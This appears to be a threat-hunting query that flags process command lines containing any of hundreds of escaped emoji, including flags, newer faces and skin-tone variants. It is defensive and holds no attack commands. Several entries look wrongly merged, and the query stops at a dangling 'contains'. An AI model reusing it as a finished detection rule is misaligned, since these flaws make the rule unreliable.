tgt.process.cmdline contains \"\ud80c\udc0c\" or tgt.process.cmdline contains \"\ud80c\udc0d\" or tgt.process.cmdline contains \"\ud80c\udc0e\" or tgt.process.cmdline contains \"\ud80c\udc0f\" or tgt.process.cmdline contains \"\ud80c\udc10\" or tgt.process.cmdline contains \"\ud80c\udc11\" or tgt.process.cmdline contains \"\ud80c\udc12\" or tgt.process.cmdline contains \"\ud80c\udc13\" or tgt.process.cmdline contains \"\ud80c\udc14\" or tgt.process.cmdline contains \"\ud80c\udc15\" or tgt.process.cmdline contains \"\ud80c\udc16\" or tgt.process.cmdline contains \"\ud80c\udc17\" or tgt.process.cmdline contains \"\ud80c\udc18\" or tgt.process.cmdline contains \"\ud80c\udc19\" or tgt.process.cmdline contains \"\ud80c\udc1a\" or tgt.process.cmdline contains \"\ud80c\udc1b\" or tgt.process.cmdline contains \"\ud80c\udc1c\" or tgt.process.cmdline contains \"\ud80c\udc1d\ud83c\udff3\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udff4\" or tgt.process.cmdline contains \"\ud83c\udfc1\" or tgt.process.cmdline contains \"\ud83d\udea9\" or tgt.process.cmdline contains \"\ud83c\udff3\ufe0f\u200d\ud83c\udf08\" or tgt.process.cmdline contains \"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udff4\u200d\u2620\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\udde9\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udded\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddee\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\udf8c\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddef\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddfd\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf6\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddfe\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\uddeb\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddf2\ud83c\uddf5\" or tgt.process.cmdline contains \"\ud83c\uddf3\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf4\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf6\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddfc\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf7\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddfd\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddff\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\udde7\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf0\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf1\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf5\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\udde9\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\udde8\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf8\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddfc\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddef\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf1\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf0\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf4\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf9\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf7\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\udde8\" or tgt.process.cmdline contains \"\ud83c\uddf9\ud83c\uddfb\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddee\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddec\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\udde6\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddec\ud83c\udde7\" or tgt.process.cmdline contains \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\" or tgt.process.cmdline contains \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f\" or tgt.process.cmdline contains \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddf8\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddfe\" or tgt.process.cmdline contains \"\ud83c\uddfa\ud83c\uddff\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddfa\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\udde6\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddfb\ud83c\uddf3\" or tgt.process.cmdline contains \"\ud83c\uddfc\ud83c\uddeb\" or tgt.process.cmdline contains \"\ud83c\uddea\ud83c\udded\" or tgt.process.cmdline contains \"\ud83c\uddfe\ud83c\uddea\" or tgt.process.cmdline contains \"\ud83c\uddff\ud83c\uddf2\" or tgt.process.cmdline contains \"\ud83c\uddff\ud83c\uddfc\ud83e\udee0\" or tgt.process.cmdline contains \"\ud83e\udee2\" or tgt.process.cmdline contains \"\ud83e\udee3\" or tgt.process.cmdline contains \"\ud83e\udee1\" or tgt.process.cmdline contains \"\ud83e\udee5\" or tgt.process.cmdline contains \"\ud83e\udee4\" or tgt.process.cmdline contains \"\ud83e\udd79\" or tgt.process.cmdline contains \"\ud83e\udef1\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef2\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef3\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef4\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef0\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef5\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef6\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udee6\" or tgt.process.cmdline contains \"\ud83e\udec5\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec3\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec4\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddcc\" or tgt.process.cmdline contains \"\ud83e\udeb8\" or tgt.process.cmdline contains \"\ud83e\udeb7\" or tgt.process.cmdline contains \"\ud83e\udeb9\" or tgt.process.cmdline contains \"\ud83e\udeba\" or tgt.process.cmdline contains \"\ud83e\uded8\" or tgt.process.cmdline contains \"\ud83e\uded7\" or tgt.process.cmdline contains \"\ud83e\uded9\" or tgt.process.cmdline contains \"\ud83d\udedd\" or tgt.process.cmdline contains \"\ud83d\udede\" or tgt.process.cmdline contains \"\ud83d\udedf\" or tgt.process.cmdline contains \"\ud83e\udeac\" or tgt.process.cmdline contains \"\ud83e\udea9\" or tgt.process.cmdline contains \"\ud83e\udeab\" or tgt.process.cmdline contains \"\ud83e\ude7c\" or tgt.process.cmdline contains \"\ud83e\ude7b\" or tgt.process.cmdline contains \"\ud83e\udee7\" or tgt.process.cmdline contains \"\ud83e\udeaa\" or tgt.process.cmdline contains \"\ud83d\udff0\" or tgt.process.cmdline contains \"\ud83d\ude2e\u200d\ud83d\udca8\" or tgt.process.cmdline contains \"\ud83d\ude35\u200d\ud83d\udcab\" or tgt.process.cmdline contains \"\ud83d\ude36\u200d\ud83c\udf2b\ufe0f\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83d\udd25\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83e\ude79\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffd\" or tgt.process.cmdline contains 